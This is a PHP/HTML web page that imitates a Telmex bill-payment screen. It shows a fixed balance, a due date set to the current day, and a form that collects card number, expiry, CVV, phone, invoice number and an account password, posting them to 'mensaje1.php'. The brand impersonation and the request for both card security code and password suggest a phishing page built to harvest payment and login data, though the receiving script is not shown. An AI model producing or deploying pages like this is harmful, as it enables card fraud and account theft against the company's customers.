<HTML>

<?php 
include("header.php"); 
?>

</BR> </BR>	<HR> </HR> </BR> </BR>

<CENTER>
<DIV class="div2">

<B style="font-family: Gill Sans MT Condensed; color: royalblue; font-size: 40px;"> TU RECIBO TELMEX </B> <br>
<B style="font-family: Gill Sans MT Condensed; color: royalblue; font-size: 27px;"> Pago con tarjeta </B> <br> <br>

<B style="font-family: Gill Sans MT Condensed; color: CornflowerBlue; font-size: 25px;"> Descripci&oacute;n: </B> Pago de servicios de telefon&iacute;a e internet Infinitum <br>
<B style="font-family: Gill Sans MT Condensed; color: CornflowerBlue; font-size: 25px;"> Mes de fracturaci&oacute;n:  </B>
<?php
$time = time();  $month = date("F");
switch ($month) {
    case "January": echo "Enero"; break;         case "February": echo "Febrero"; break;
    case "March": echo "Marzo"; break;           case "April": echo "Abril"; break;
    case "May": echo "Mayo"; break;              case "June": echo "Junio"; break;
    case "July": echo "Julio"; break;            case "August": echo "Agosto"; break;
    case "September": echo "Septiembre"; break;  case "October": echo "Octubre	"; break;
    case "November": echo "Noviembre"; break;    case "December": echo "Diciembre"; break;     
} echo date("");
?>
<br>

<B style="font-family: Gill Sans MT Condensed; color: CornflowerBlue; font-size: 25px;"> Pagar antes de: </B>
<?php
$time = time();
echo date("d  m  Y", $time);
?>
<br>

<B style="font-family: Gill Sans MT Condensed; color: CornflowerBlue; font-size: 25px;"> Saldo al corte: </B> $389 <br>


<FORM action="mensaje1.php" method="post">
<br>

<input style="width: 400px;" type="text" name="NOMBRE" class="cajas" required="" placeholder="N&uacute;mero Telmex">

<input style="width: 400px;" type="text" name="NOMBRE" class="cajas" required="" placeholder="Titular de la l&iacute;nea">
<br> <br>


<input style="width: 400px;" type="text" name="IMPORTE" class="cajas" required="" placeholder="N&uacute;mero de tarjeta">

<input style="width: 400px;" type="text" name="IMPORTE" class="cajas" required="" placeholder="Importe a pagar (MXN)">
<br> <br>

<input style="width: 400px;" type="text" name="IMPORTE" class="cajas" required="" placeholder="Tel&eacute;fono">

<input style="width: 400px;" type="text" name="IMPORTE" class="cajas" required="" placeholder="Fecha (d&iacute;a/mes/año)">
<br> <br>

<input style="width: 200px;" type="text" name="IMPORTE" class="cajas" required="" placeholder="Fecha de expiraci&oacute;n">

<input style="width: 200px;" type="text" name="IMPORTE" class="cajas" required="" placeholder="CVV">
<br> <br>

<input style="width: 400px;" type="text" name="IMPORTE" class="cajas" required="" placeholder="No. de factura">
<br> <br>

<input style="width: 400px;" type="password" name="IMPORTE" class="cajas" required="" placeholder="Contraseña">
<br> <br>

<input style="width: 15px;" type="checkbox" name="NOMBRE" class="cajas" placeholder="Apellido"> 
<B style="width: 12px;"> Guardar mi tarjeta </B> <br>
<input style="width: 15px;" type="checkbox" name="NOMBRE" class="cajas" placeholder="Apellido"> 
<B style="width: 12px;"> Domicilia el pago de tu servicio Telmex </B> <br>

<B style="font-family: Gill Sans MT Condensed; font-size: 17px;"> Pago procesado de manera segura </B> 
<br> <br>
  <center>
    <input class="btn" type="submit" name="submit" value="Pagar" onclick="">
  </center>
<br>
  <A> ¿Necesitas ayuda? </A>
  <br>
</FORM>
</DIV>
</CENTER>    
    </BODY>
    
<?php
include("footer.php");
?>
    
</HTML>